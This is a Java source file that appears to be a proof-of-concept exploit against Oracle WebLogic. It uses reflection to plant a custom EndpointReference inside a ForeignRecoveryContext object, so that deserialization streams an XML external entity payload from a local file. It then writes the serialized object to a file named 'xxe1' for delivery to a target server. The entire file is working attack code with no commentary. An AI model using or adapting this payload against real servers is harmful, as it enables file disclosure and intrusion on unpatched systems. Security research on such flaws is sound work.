import weblogic.wsee.wstx.internal.ForeignRecoveryContext;
import weblogic.wsee.wstx.wsat.Transactional.Version;
import javax.xml.ws.EndpointReference;

import javax.transaction.xa.Xid;
import javax.xml.transform.Result;
import javax.xml.transform.stream.StreamResult;
import java.io.*;
import java.lang.reflect.Field;

public class weblogicxxe1 {
    public static void main(String[] args) throws IOException {
        Object instance = getXXEObject();
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("xxe1"));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static class MyEndpointReference extends EndpointReference {

        @Override
        public  void writeTo(Result result){
            byte[] tmpbytes = new byte[4096];
            int nRead;
            try{
                InputStream is = new FileInputStream(System.getProperty("user.dir")+"/src/main/resources/text.xml");

                while((nRead=is.read(tmpbytes,0,tmpbytes.length)) != -1){
                    ((StreamResult)result).getOutputStream().write(tmpbytes,0,nRead);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
            return;
        }
    }
    public static Object getXXEObject() {
        Xid xid = new weblogic.transaction.internal.XidImpl();
        Version v = Version.DEFAULT;
        ForeignRecoveryContext frc = new ForeignRecoveryContext();
        try{
            Field f = frc.getClass().getDeclaredField("fxid");
            f.setAccessible(true);
            f.set(frc,xid);
            Field f1 = frc.getClass().getDeclaredField("epr");
            f1.setAccessible(true);
            f1.set(frc, new MyEndpointReference());
            Field f2 = frc.getClass().getDeclaredField("version");
            f2.setAccessible(true);
            f2.set(frc,v);
        }catch(Exception e){
            e.printStackTrace();
        }
        return frc;
    }
}
